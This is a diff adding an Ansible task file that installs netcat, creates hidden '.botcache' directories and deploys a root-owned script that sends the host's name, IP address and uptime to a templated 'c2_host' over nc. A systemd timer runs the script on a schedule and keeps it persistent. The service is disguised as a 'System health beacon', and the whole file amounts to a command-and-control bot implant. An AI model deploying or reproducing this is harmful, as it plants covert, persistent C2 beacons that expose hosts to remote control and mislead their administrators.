@@ -1,0 +1,87 @@
+---
+- name: Install netcat
+  apt:
+    name: netcat-openbsd
+    state: present
+    update_cache: yes
+
+- name: Ensure bot cache directories exist
+  file:
+    path: "{{ item }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+  loop:
+    - /usr/local/lib/.botcache
+    - /var/lib/.botcache
+
+- name: Create beacon script
+  copy:
+    dest: "{{ beacon_script_path }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/sh
+      set -eu
+
+      sleep $((RANDOM % {{ beacon_delay_seconds | int + 1 }}))
+
+      LOG="{{ beacon_log }}"
+
+      HOSTNAME=$(hostname)
+      IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unknown")
+      UPTIME=$(uptime -p 2>/dev/null || uptime)
+      PAYLOAD="BEACON|${HOSTNAME}|${IP}|$(date -Is)|${UPTIME}"
+
+      RESPONSE=$(printf "%s\n" "$PAYLOAD" | nc -w 5 {{ c2_host | quote }} {{ c2_port | int }} 2>/dev/null || true)
+
+      echo "---- $(date) ----" >> "$LOG"
+      echo "sent: $PAYLOAD" >> "$LOG"
+      if [ -n "$RESPONSE" ]; then
+        echo "recv: $RESPONSE" >> "$LOG"
+      fi
+
+- name: Create beacon systemd service
+  copy:
+    dest: "/etc/systemd/system/{{ beacon_service_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=System health beacon
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart={{ beacon_script_path }}
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create beacon systemd timer
+  copy:
+    dest: "/etc/systemd/system/{{ beacon_timer_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Periodic system health beacon
+
+      [Timer]
+      OnCalendar={{ beacon_schedule }}
+      Persistent=true
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Enable and start beacon timer
+  systemd:
+    name: "{{ beacon_timer_unit }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
